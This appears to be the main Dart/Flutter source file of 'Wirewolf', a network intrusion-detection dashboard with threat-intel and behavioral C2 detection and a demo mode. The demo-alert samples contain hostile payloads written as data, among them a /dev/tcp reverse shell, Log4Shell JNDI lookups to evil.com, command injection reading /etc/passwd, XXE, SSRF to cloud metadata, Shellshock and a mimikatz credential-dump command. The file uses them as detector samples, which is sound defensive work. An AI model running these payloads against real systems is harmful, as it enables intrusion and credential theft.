import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart' show rootBundle;
import 'package:file_picker/file_picker.dart';
import 'util/incident_report_pdf.dart';
import 'theme/app_theme.dart';
import 'ffi/wirewolf_service.dart';
import 'ffi/geo_ip.dart';
import 'screens/dashboard_screen.dart';
import 'screens/config_screen.dart';
import 'screens/activity_screen.dart';
import 'screens/log_screen.dart';
import 'screens/threat_map_screen.dart';
import 'widgets/top_bar.dart';
import 'widgets/status_bar.dart';
import 'widgets/command_palette.dart';
import 'panels/console_panel.dart';
import 'panels/alert_inspector.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  // Load the offline IP→country geolocation DB in the background; the map and
  // inspector fall back to an approximation until it's ready.
  GeoIpDb.load();
  runApp(const WirewolfApp());
}

class WirewolfApp extends StatelessWidget {
  const WirewolfApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Wirewolf',
      debugShowCheckedModeBanner: false,
      theme: AppTheme.light,
      home: const AppShell(),
    );
  }
}

class AppShell extends StatefulWidget {
  const AppShell({super.key});

  @override
  State<AppShell> createState() => _AppShellState();
}

class _AppShellState extends State<AppShell> {
  int _selectedTab = 0;
  int? _selectedAlertIndex;
  bool _paletteOpen = false;
  bool _consoleCollapsed = false;
  bool _inspectorCollapsed = false;
  WirewolfService? _service;
  bool _demoMode = false;
  String? _initError;

  // Shared state
  PipelineState _pipelineState = PipelineState.stopped;
  StatsData? _stats;
  final List<AlertData> _alerts = [];
  // Source IPs the analyst has muted — their alerts are dropped on arrival and
  // hidden from the views (client-side noise suppression).
  final Set<String> _mutedSources = {};
  final List<FlowEventData> _flowEvents = [];
  final List<LogEntryData> _logEntries = [];

  StreamSubscription? _statsSub;
  StreamSubscription? _alertsSub;
  StreamSubscription? _stateSub;
  StreamSubscription? _flowSub;
  StreamSubscription? _logSub;

  @override
  void initState() {
    super.initState();
    _initBackend();
  }

  void _initBackend() {
    // Find wirewolf.dll relative to the executable
    final exeDir = File(Platform.resolvedExecutable).parent.path;
    final searchPaths = [
      '$exeDir\\wirewolf.dll',
      '$exeDir\\..\\..\\..\\..\\..\\build\\ffi\\Release\\wirewolf.dll',
      'D:\\SideProject\\build\\ffi\\Release\\wirewolf.dll',
    ];

    String? dllPath;
    for (final p in searchPaths) {
      if (File(p).existsSync()) {
        dllPath = p;
        break;
      }
    }

    if (dllPath == null) {
      _switchToDemo('wirewolf.dll not found. Searched:\n${searchPaths.join('\n')}');
      return;
    }

    _service = WirewolfService(dllPath);
    final err = _service!.initialize();
    if (err != null) {
      _switchToDemo(err);
      return;
    }

    _addLog(1, 'app', 'Loaded wirewolf.dll from $dllPath');

    // Hand the bundled threat-intel DB to the engine (extract to disk so the
    // native side can read it + its .str sibling).
    _setupThreatDb();

    // Auto-load the bundled behavioral C2 Markov models (fixed encoder config,
    // balanced default threshold) — no user configuration needed.
    _setupBehavioral();

    // Subscribe to real data
    _statsSub = _service!.stats.listen((s) {
      setState(() => _stats = s);
    });
    _alertsSub = _service!.alerts.listen((a) {
      if (_mutedSources.contains(a.srcIp)) return; // muted source
      // Stage-2 adjudication: behavioral C2 candidates are high-recall but
      // noisy, so suppress the obvious benign ones (standard web port to a
      // major cloud/CDN, not threat-flagged) before they reach the analyst.
      if (_behavioralFalsePositive(a)) {
        _addLog(1, 'behavioral',
            'Suppressed benign behavioral candidate ${a.dstIp}:${a.dstPort} '
            '(${ispLabelFor(externalEndpoint(a.srcIp, a.dstIp)?.ip ?? a.dstIp)})');
        return;
      }
      setState(() => _alerts.add(a));
    });
    _stateSub = _service!.stateChanges.listen((s) {
      setState(() => _pipelineState = s);
      _addLog(1, 'pipeline', 'State changed: ${s.name}');
    });
    _flowSub = _service!.flowEvents.listen((e) {
      setState(() {
        _flowEvents.add(e);
        if (_flowEvents.length > 5000) {
          _flowEvents.removeRange(0, _flowEvents.length - 5000);
        }
      });
    });
    _logSub = _service!.logs.listen((l) {
      setState(() {
        _logEntries.add(l);
        if (_logEntries.length > 5000) {
          _logEntries.removeRange(0, _logEntries.length - 5000);
        }
      });
    });
  }

  Future<void> _setupThreatDb() async {
    try {
      final dir = Directory('${Directory.systemTemp.path}\\wirewolf_geo');
      await dir.create(recursive: true);
      for (final f in ['proxy.bin', 'proxy.str']) {
        final data = await rootBundle.load('assets/geo/$f');
        await File('${dir.path}\\$f').writeAsBytes(
            data.buffer.asUint8List(data.offsetInBytes, data.lengthInBytes),
            flush: true);
      }
      _service?.setThreatDb('${dir.path}\\proxy.bin');
      _addLog(1, 'intel', 'Threat-intel DB ready (IP2Location PX12)');
    } catch (e) {
      _addLog(2, 'intel', 'Threat-intel DB setup failed: $e');
    }
  }

  // Extract the bundled behavioral C2 Markov models and enable detection with
  // the balanced default LLR threshold. The encoder config is fixed in the
  // engine to match how these models were trained, so nothing is user-tunable.
  Future<void> _setupBehavioral() async {
    try {
      final dir = Directory('${Directory.systemTemp.path}\\wirewolf_models');
      await dir.create(recursive: true);
      for (final f in [
        'behavioral.botnet.model',
        'behavioral.normal.model'
      ]) {
        final data = await rootBundle.load('assets/models/$f');
        await File('${dir.path}\\$f').writeAsBytes(
            data.buffer.asUint8List(data.offsetInBytes, data.lengthInBytes),
            flush: true);
      }
      _service?.setBehavioral(dir.path, -0.25); // balanced operating point
      _addLog(1, 'behavioral', 'Behavioral C2 models ready (threshold -0.25)');
    } catch (e) {
      _addLog(2, 'behavioral', 'Behavioral model setup failed: $e');
    }
  }

  void _switchToDemo(String reason) {
    setState(() {
      _demoMode = true;
      _initError = reason;
      _pipelineState = PipelineState.running;
    });
    _addLog(2, 'app', 'Running in DEMO mode: $reason');
    _generateDemoData();
  }

  void _addLog(int level, String component, String message) {
    setState(() {
      _logEntries.add(LogEntryData(
        level: level, component: component,
        message: message, timestamp: DateTime.now(),
      ));
      if (_logEntries.length > 5000) {
        _logEntries.removeRange(0, _logEntries.length - 5000);
      }
    });
  }

  /// Wipes all accumulated data so switching to a new pcap doesn't keep
  /// showing stale alerts/events/logs from the previous capture.
  void _clearAll() {
    setState(() {
      _alerts.clear();
      _flowEvents.clear();
      _logEntries.clear();
      _mutedSources.clear();
      _stats = null;
      _selectedAlertIndex = null;
    });
    _addLog(1, 'app', 'Cleared all alerts, events and logs');
    _toast('Cleared');
  }

  /// Forensic deliverable: build an interactive PDF incident report (outline
  /// bookmarks, clickable contents, fillable triage fields) from the current
  /// alerts and save it to a user-chosen file.
  Future<void> _exportIncidentReport() async {
    if (_alerts.isEmpty) {
      _toast('No alerts to export');
      return;
    }
    try {
      final report = await buildIncidentReportPdf(_alerts);
      final path = await FilePicker.platform.saveFile(
        dialogTitle: 'Save incident report',
        fileName:
            'wirewolf-incident-${DateTime.now().millisecondsSinceEpoch}.pdf',
        type: FileType.custom,
        allowedExtensions: ['pdf'],
      );
      if (path == null) return; // user cancelled
      final out = path.toLowerCase().endsWith('.pdf') ? path : '$path.pdf';
      await File(out).writeAsBytes(report);
      _addLog(1, 'report', 'Incident report exported to $out');
      _toast('Saved report to $out');
    } catch (e) {
      _addLog(3, 'report', 'Report export failed: $e');
      _toast('Export failed: $e');
    }
  }

  /// Mute the selected alert's source IP: drop its existing alerts and suppress
  /// future ones. Wires the previously-stubbed inspector "Mute" action.
  void _muteSelectedSource() {
    final i = _selectedAlertIndex;
    if (i == null || i < 0 || i >= _alerts.length) {
      _toast('Select an alert first');
      return;
    }
    final ip = _alerts[i].srcIp;
    setState(() {
      _mutedSources.add(ip);
      _alerts.removeWhere((a) => a.srcIp == ip);
      _selectedAlertIndex = null;
    });
    _addLog(1, 'app', 'Muted source $ip (${_mutedSources.length} muted)');
    _toast('Muted alerts from $ip');
  }

  /// Stage-2 contextual adjudication for behavioral C2 candidates only. Returns
  /// true when the candidate is almost certainly benign and should be dropped.
  ///
  /// Rule: outbound HTTPS/HTTP/DNS (443/80/53) with no threat-intel tag is
  /// ordinary web traffic — suppress it regardless of which provider it is (a
  /// keyword allowlist can't enumerate every legit company: Anthropic, your
  /// bank, every SaaS…). Behavioral Markov can't distinguish benign HTTPS from
  /// HTTPS-C2 anyway, so C2-over-443 is left to threat-intel + beaconing
  /// regularity; the behavioral detector's value is odd-port outbound.
  /// Threat-intel-tagged endpoints are never suppressed (they confirm the flag).
  bool _behavioralFalsePositive(AlertData a) {
    if (a.payloadText != '[behavioral-c2]') return false; // only behavioral flags
    final ext = externalEndpoint(a.srcIp, a.dstIp);
    if (ext == null) return false; // internal-only — leave for review
    if (threatTagFor(ext.ip).isNotEmpty) return false; // confirmed by threat intel
    return a.dstPort == 443 || a.dstPort == 80 || a.dstPort == 53; // web traffic
  }

  void _onStart() {
    if (_service == null || !_service!.isInitialized) return;
    final success = _service!.start();
    if (!success) {
      final err = _service!.getLastError();
      _addLog(3, 'pipeline', 'Failed to start: ${err ?? 'unknown error'}');
    }
  }

  void _onStop() {
    if (_service == null) return;
    _service!.stop();
    _addLog(1, 'pipeline', 'Pipeline stop requested');
  }

  void _generateDemoData() {
    final now = DateTime.now();
    final sampleAlerts = [
      _demoAlert(now.subtract(const Duration(minutes: 55)), 'SQLi', 4, 9.3, "' OR '1'='1", '10.0.0.50', '192.168.1.5', 49812, 80),
      _demoAlert(now.subtract(const Duration(minutes: 52)), 'SQLi', 4, 9.3, "UNION SELECT * FROM users--", '10.0.0.50', '192.168.1.5', 49813, 80),
      _demoAlert(now.subtract(const Duration(minutes: 48)), 'Port Scan', 2, 6.9, '52 unique ports scanned', '10.0.0.100', '192.168.1.1', 0, 0),
      _demoAlert(now.subtract(const Duration(minutes: 45)), 'XSS', 2, 5.3, '<script>alert(1)</script>', '10.0.0.50', '192.168.1.5', 48100, 80),
      _demoAlert(now.subtract(const Duration(minutes: 42)), 'Log4Shell', 4, 10.0, '\${jndi:ldap://evil.com/a}', '10.0.0.50', '192.168.1.20', 51234, 8080),
      _demoAlert(now.subtract(const Duration(minutes: 40)), 'Log4Shell', 4, 10.0, '\${jndi:rmi://evil.com/b}', '10.0.0.51', '192.168.1.20', 51235, 8080),
      _demoAlert(now.subtract(const Duration(minutes: 38)), 'Data Exfiltration', 4, 9.3, 'Username: victim@gmail.com', '10.2.3.101', '162.241.123.75', 54050, 47037),
      _demoAlert(now.subtract(const Duration(minutes: 35)), 'SSH Brute Force', 3, 7.7, '45 SSH connection attempts', '10.0.0.200', '192.168.1.10', 0, 22),
      _demoAlert(now.subtract(const Duration(minutes: 32)), 'SSH Brute Force', 3, 7.7, '38 SSH connection attempts', '10.0.0.201', '192.168.1.10', 0, 22),
      _demoAlert(now.subtract(const Duration(minutes: 30)), 'Command Injection', 4, 9.3, ';cat /etc/passwd', '10.0.0.50', '192.168.1.5', 48200, 80),
      _demoAlert(now.subtract(const Duration(minutes: 28)), 'Reverse Shell', 4, 9.3, 'bash -i >& /dev/tcp/10.0.0.50/4444', '10.0.0.50', '192.168.1.5', 45900, 80),
      _demoAlert(now.subtract(const Duration(minutes: 25)), 'C2 Beaconing', 4, 9.3, 'C2 beaconing to 45.76.33.10:8443', '192.168.1.100', '45.76.33.10', 49200, 8443),
      _demoAlert(now.subtract(const Duration(minutes: 22)), 'Path Traversal', 3, 8.7, '../../../../etc/passwd', '10.0.0.50', '192.168.1.5', 47100, 80),
      _demoAlert(now.subtract(const Duration(minutes: 20)), 'Cryptominer Traffic', 3, 8.7, 'mining.subscribe', '192.168.1.100', '45.76.33.10', 49200, 3333),
      _demoAlert(now.subtract(const Duration(minutes: 18)), 'DDoS', 3, 8.7, '8500 SYN packets at 120 SYN/sec', '10.0.0.200', '192.168.1.5', 0, 80),
      _demoAlert(now.subtract(const Duration(minutes: 15)), 'Directory Enumeration', 2, 6.9, '/.env, /.git/config, /wp-admin', '10.0.0.50', '192.168.1.5', 44100, 80),
      _demoAlert(now.subtract(const Duration(minutes: 12)), 'XXE', 3, 8.7, '<!ENTITY xxe SYSTEM "file:///etc/passwd">', '10.0.0.50', '192.168.1.5', 46500, 80),
      _demoAlert(now.subtract(const Duration(minutes: 10)), 'SSTI', 4, 9.3, '{{7*7}}', '10.0.0.50', '192.168.1.5', 49000, 80),
      _demoAlert(now.subtract(const Duration(minutes: 8)), 'Credential Theft', 4, 9.3, 'sekurlsa::logonpasswords', '10.0.0.50', '192.168.1.30', 55100, 445),
      _demoAlert(now.subtract(const Duration(minutes: 6)), 'Vulnerability Scanning', 2, 6.9, 'Nikto/2.1.6', '10.0.0.50', '192.168.1.5', 40500, 80),
      _demoAlert(now.subtract(const Duration(minutes: 5)), 'SSRF', 3, 8.7, 'http://169.254.169.254/latest/meta-data/', '10.0.0.50', '192.168.1.5', 42700, 80),
      _demoAlert(now.subtract(const Duration(minutes: 3)), 'Shellshock', 4, 9.3, '() { :;}; /bin/bash -c', '10.0.0.50', '192.168.1.5', 43800, 80),
      _demoAlert(now.subtract(const Duration(minutes: 2)), 'Worm Propagation Scan', 4, 10.0, '150 hosts scanned on port 445', '10.0.0.200', '192.168.1.1', 0, 445),
      _demoAlert(now.subtract(const Duration(minutes: 1)), 'RAT C2', 4, 9.3, 'njRAT C2 on 45.76.33.10:5552', '192.168.1.100', '45.76.33.10', 55200, 5552),
    ];
    _alerts.addAll(sampleAlerts);

    _stats = StatsData(
      filterPassed: 247, filterDropped: 1832, filterDeduped: 89,
      alertsFired: sampleAlerts.length,
      queueReassemblyDepth: 3, queueReassemblyCapacity: 1024, queueReassemblyDrops: 0,
      queueLlmDepth: 1, queueLlmCapacity: 1024, queueLlmDrops: 0,
      captureFinished: false, blockedPackets: 0, blockedSources: 0,
      filterDevice: 'Statistical',
    );

    final demoEvents = [
      (0, 'statistical', '10.0.0.50', 49812, '192.168.1.5', 80, 342),
      (1, 'anomaly', '10.0.0.50', 49813, '192.168.1.5', 80, 512),
      (0, 'benign HTTP', '192.168.1.50', 52100, '10.0.0.5', 443, 1200),
      (0, 'binary', '10.0.0.100', 55200, '192.168.1.30', 445, 8192),
      (1, 'heartbleed', '10.0.0.50', 48100, '192.168.1.5', 443, 256),
      (0, 'SPNEGO', '192.168.1.10', 54312, '10.0.0.1', 88, 187),
      (2, 'llm:benign', '10.0.0.50', 49814, '192.168.1.5', 80, 890),
      (1, 'smb-exploit', '10.0.0.50', 49815, '192.168.1.30', 445, 15000),
      (0, 'dedup', '10.0.0.50', 49816, '192.168.1.5', 80, 342),
      (1, 'rat-c2', '192.168.1.100', 55200, '45.76.33.10', 5552, 4200),
      (1, 'credential-content', '10.2.3.101', 54050, '162.241.123.75', 47037, 754),
      (0, 'benign HTTP', '192.168.1.50', 54300, '10.0.0.5', 443, 180),
    ];
    for (var i = 0; i < demoEvents.length; i++) {
      final (action, reason, srcIp, srcPort, dstIp, dstPort, size) = demoEvents[i];
      _flowEvents.add(FlowEventData(
        srcIp: srcIp, srcPort: srcPort, dstIp: dstIp, dstPort: dstPort,
        action: action, reason: reason, payloadSize: size,
        timestamp: now.subtract(Duration(seconds: (demoEvents.length - i) * 2)),
      ));
    }

    final demoLogs = [
      (1, 'pcap', 'Opening offline capture: test.pcap'),
      (1, 'filter', 'Using statistical anomaly filter'),
      (1, 'llm', 'Loading model: llama-8b-q4.gguf (gpu_layers=99)'),
      (1, 'llm', 'Model loaded (ctx=8192)'),
      (1, 'pipeline', 'All pipeline stages running.'),
      (0, 'filter', 'PASS entropy=7.23 var=12045 iat=0.002 size=342'),
      (1, 'llm', 'ALERT: {"threat_type": "SQLi", "cvss": 9.3}'),
      (2, 'llm', 'Hallucination suppressed: snippet not found'),
      (1, 'pcap', 'CONNECTION ALERT: Port Scan - 52 unique ports'),
      (1, 'llm', 'ALERT: {"threat_type": "Log4Shell", "cvss": 10.0}'),
      (1, 'pipeline', 'Filter stats — passed: 247 filtered: 1832 deduped: 89'),
    ];
    for (var i = 0; i < demoLogs.length; i++) {
      final (level, comp, msg) = demoLogs[i];
      _logEntries.add(LogEntryData(
        level: level, component: comp, message: msg,
        timestamp: now.subtract(Duration(seconds: (demoLogs.length - i) * 3)),
      ));
    }
  }

  AlertData _demoAlert(DateTime time, String type, int sevLevel, double cvss,
      String snippet, String srcIp, String dstIp, int srcPort, int dstPort) {
    final labels = ['Info', 'Low', 'Medium', 'High', 'Critical'];
    return AlertData(
      srcIp: srcIp, srcPort: srcPort, dstIp: dstIp, dstPort: dstPort,
      threatType: type, severity: labels[sevLevel], cvss: cvss,
      severityLevel: sevLevel, snippet: snippet,
      rawLlmOutput: '{"threat_type": "$type", "cvss": $cvss}',
      payloadText: snippet, timestamp: time,
    );
  }

  @override
  void dispose() {
    _statsSub?.cancel();
    _alertsSub?.cancel();
    _stateSub?.cancel();
    _flowSub?.cancel();
    _logSub?.cancel();
    _service?.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          Column(
            children: [
              TopBar(
                onPaletteTap: () =>
                    setState(() => _paletteOpen = !_paletteOpen),
                paletteOpen: _paletteOpen,
                pipelineState: _pipelineState,
                demoMode: _demoMode,
                alertCount: _alerts.length,
                onClear: _clearAll,
              ),
              Expanded(
                child: Row(
                  children: [
                    _buildRail(),
                    Expanded(child: _buildCenter()),
                  ],
                ),
              ),
              StatusBar(
                pipelineState: _pipelineState,
                stats: _stats,
                alertCount: _alerts.length,
              ),
            ],
          ),
          if (_paletteOpen)
            CommandPalette(
              commands: _commands(),
              onClose: () => setState(() => _paletteOpen = false),
            ),
        ],
      ),
    );
  }

  void _toast(String msg) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(msg),
        behavior: SnackBarBehavior.floating,
        duration: const Duration(seconds: 2),
      ),
    );
  }

  List<PaletteCommand> _commands() => [
        PaletteCommand('Go to Dashboard', 'nav:dashboard', Icons.grid_view_rounded,
            () => setState(() => _selectedTab = 0)),
        PaletteCommand('Open Settings', 'nav:settings', Icons.tune_rounded,
            () => setState(() => _selectedTab = 1)),
        PaletteCommand('Live Activity', 'nav:activity', Icons.graphic_eq_rounded,
            () => setState(() => _selectedTab = 2)),
        PaletteCommand('View Logs', 'nav:log', Icons.terminal_rounded,
            () => setState(() => _selectedTab = 3)),
        PaletteCommand('Threat Map', 'nav:map', Icons.public_rounded,
            () => setState(() => _selectedTab = 4)),
        PaletteCommand('Acknowledge Alert', 'alert:ack', Icons.task_alt,
            () => setState(() => _selectedAlertIndex = null)),
        PaletteCommand('Create Detection Rule', 'rule:new', Icons.description_outlined,
            () => setState(() => _selectedTab = 1)),
        PaletteCommand('Export Incident Report', 'report:export', Icons.ios_share,
            _exportIncidentReport),
        PaletteCommand('Clear All Data', 'data:clear', Icons.delete_sweep_outlined,
            _clearAll),
      ];

  Widget _buildRail() {
    return Container(
      width: 56,
      decoration: const BoxDecoration(
        color: AppColors.surface,
        border: Border(right: BorderSide(color: AppColors.border, width: 1)),
      ),
      child: Column(
        children: [
          const SizedBox(height: 10),
          _navItem(0, Icons.grid_view_rounded, 'Dashboard'),
          _navItem(1, Icons.tune_rounded, 'Settings'),
          _navItem(2, Icons.graphic_eq_rounded, 'Activity'),
          _navItem(3, Icons.terminal_rounded, 'Log'),
          _navItem(4, Icons.public_rounded, 'Threat Map'),
          const Spacer(),
          if (_demoMode)
            Tooltip(
              message: (_initError != null && _initError!.isNotEmpty)
                  ? 'Demo mode — $_initError'
                  : 'Demo mode (no live backend connected)',
              child: Container(
                margin: const EdgeInsets.only(bottom: 10),
                padding: const EdgeInsets.symmetric(horizontal: 5, vertical: 2),
                decoration: BoxDecoration(
                  color: AppColors.warning.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(4),
                ),
                child: const Text('DEMO',
                    style: TextStyle(
                        color: AppColors.warning,
                        fontSize: 8,
                        fontWeight: FontWeight.w700)),
              ),
            ),
          Container(
            width: 8,
            height: 8,
            margin: const EdgeInsets.only(bottom: 16),
            decoration: BoxDecoration(
              color: switch (_pipelineState) {
                PipelineState.running => AppColors.success,
                PipelineState.starting => AppColors.warning,
                PipelineState.stopping => AppColors.warning,
                PipelineState.error => AppColors.error,
                PipelineState.stopped => AppColors.textMuted,
              },
              shape: BoxShape.circle,
            ),
          ),
        ],
      ),
    );
  }

  Widget _navItem(int index, IconData icon, String tooltip) {
    final selected = _selectedTab == index;
    return Tooltip(
      message: tooltip,
      preferBelow: false,
      waitDuration: const Duration(milliseconds: 400),
      child: InkWell(
        onTap: () => setState(() => _selectedTab = index),
        child: Container(
          width: 56,
          height: 46,
          decoration: BoxDecoration(
            color: selected
                ? AppColors.accent.withOpacity(0.10)
                : Colors.transparent,
            border: Border(
              left: BorderSide(
                color: selected ? AppColors.accent : Colors.transparent,
                width: 2,
              ),
            ),
          ),
          child: Icon(icon,
              size: 19,
              color: selected ? AppColors.accent : AppColors.textMuted),
        ),
      ),
    );
  }

  Widget _buildCenter() {
    final screen = switch (_selectedTab) {
      0 => DashboardScreen(
          service: _service,
          alerts: _alerts,
          stats: _stats,
          pipelineState: _pipelineState,
          demoMode: _demoMode,
          selectedAlertIndex: _selectedAlertIndex,
          onSelectAlert: (i) => setState(() => _selectedAlertIndex = i),
        ),
      1 => ConfigScreen(
          service: _service,
          pipelineState: _pipelineState,
          onStart: _demoMode
              ? () => setState(() => _pipelineState = PipelineState.running)
              : _onStart,
          onStop: _demoMode
              ? () => setState(() => _pipelineState = PipelineState.stopped)
              : _onStop,
        ),
      2 => ActivityScreen(events: _flowEvents),
      3 => LogScreen(entries: _logEntries),
      4 => ThreatMapScreen(alerts: _alerts),
      _ => const SizedBox(),
    };

    // The Dashboard gets the full SOC layout: center column flanked by the
    // Alert Inspector, with the Console docked below. Other screens fill the
    // whole content area.
    if (_selectedTab == 0) {
      final selected = (_selectedAlertIndex != null &&
              _selectedAlertIndex! < _alerts.length)
          ? _alerts[_selectedAlertIndex!]
          : null;
      return LayoutBuilder(
        builder: (context, constraints) {
          // On a narrow window the inspector is force-collapsed so the charts
          // keep room; the user can still expand it manually once there's space.
          final tight = constraints.maxWidth < 1080;
          final inspectorCollapsed = _inspectorCollapsed || tight;
          return Column(
            children: [
              Expanded(
                child: Row(
                  children: [
                    Expanded(child: screen),
                    AlertInspector(
                      alert: selected,
                      alertNumber: _selectedAlertIndex == null
                          ? null
                          : _selectedAlertIndex! + 1,
                      collapsed: inspectorCollapsed,
                      onToggleCollapse: () => setState(
                          () => _inspectorCollapsed = !inspectorCollapsed),
                      onAcknowledge: () =>
                          setState(() => _selectedAlertIndex = null),
                      onMute: _muteSelectedSource,
                    ),
                  ],
                ),
              ),
              ConsolePanel(
                alerts: _alerts,
                flowEvents: _flowEvents,
                logs: _logEntries,
                collapsed: _consoleCollapsed,
                onToggleCollapse: () =>
                    setState(() => _consoleCollapsed = !_consoleCollapsed),
              ),
            ],
          );
        },
      );
    }
    return screen;
  }
}
